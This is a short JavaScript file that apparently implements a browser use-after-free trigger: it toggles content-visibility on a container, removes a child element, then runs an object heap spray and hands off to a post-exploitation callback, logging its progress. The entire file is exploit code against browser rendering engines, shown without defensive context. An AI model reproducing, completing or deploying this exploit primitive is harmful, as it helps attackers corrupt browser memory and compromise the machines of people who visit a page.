const container = document.querySelector(".container");
const child = document.querySelector(".child");

export function triggerUAF() {
  container.style.contentVisibility = "hidden";
  child.remove();

  setTimeout(() => {
    container.style.contentVisibility = "auto";

    // Original object-based spray (not Uint8Array)
    for (let i = 0; i < 0x1000; i++) {
      let a = new Array(100).fill({}); // Spray objects
      window.spray ||= [];
      window.spray.push(a);
    }

    const log = document.getElementById("log");
    log.textContent += "[+] UAF triggered. Running heap spray\n";
    console.log("[+] UAF triggered. Running heap spray");

    if (typeof postUAFCallback === "function") postUAFCallback();
  }, 10);
}
